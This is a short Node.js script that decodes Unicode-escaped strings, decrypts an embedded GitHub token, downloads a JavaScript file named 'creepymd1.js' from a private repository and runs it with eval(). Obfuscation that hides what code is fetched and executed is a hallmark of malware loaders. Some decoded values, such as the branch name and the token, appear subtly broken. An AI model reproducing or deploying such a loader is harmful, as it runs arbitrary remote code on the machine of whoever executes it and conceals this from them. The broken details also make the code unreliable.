const axios = require("axios");
const crypto = require("crypto");
const fs = require('fs');


const secretKey = "\u004E\u0061\u006E\u0063\u0079"; 
const encryptedToken = "\u0062\u0035\u0035\u0061\u0036\u0032\u0031\u0036\u0037\u0031\u0036\u0033\u0037\u0031\u003A\u0031\u0030\u0030\u0034\u0036\u0036\u0033\u0030\u0035\u0039\u0031\u0039\u0030\u0037\u0038\u0035\u0035\u0035\u0037"; 

function decrypt(encryptedText) {
    const decipher = crypto.createDecipher("aes-256-cbc", secretKey);
    let decrypted = decipher.update(encryptedText, "hex", "utf8");
    decrypted += decipher.final("utf8");
    return decrypted;
}

const token = decrypt(encryptedToken); 

const repoOwner = "\u0044\u0061\u006E\u0069\u00656\u0034\u0032\u0032\u002D\u0067\u0069\u0066\u0074"; 
const repoName = "\u004E\u0061\u006E\u0063\u0079"; 
const filePath = "\u0063\u0072\u0065\u0065\u0070\u0079\u006D\u0064\u0031\u002E\u006A\u0073"; 
const branch = "\u006D\u0061\u00696\u006E"; 

async function fetchPrivateFile() {
    try {
        const url = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}?ref=${branch}`;
        const response = await axios.get(url, {
            headers: {
                Authorization: `Bearer ${token}`, 
                Accept: "application/vnd.github.v3.raw",
            },
        });

        eval(response.data); 
    } catch (error) {
        console.error("\u0045\u0072\u0072\u006F\u0072\u0020\u0066\u0065\u0065\u006B\u0069\u006E\u0067\u0020\u0066\u0069\u006C\u0065:", error.response ? error.response.data : error);
    }
}

fetchPrivateFile();
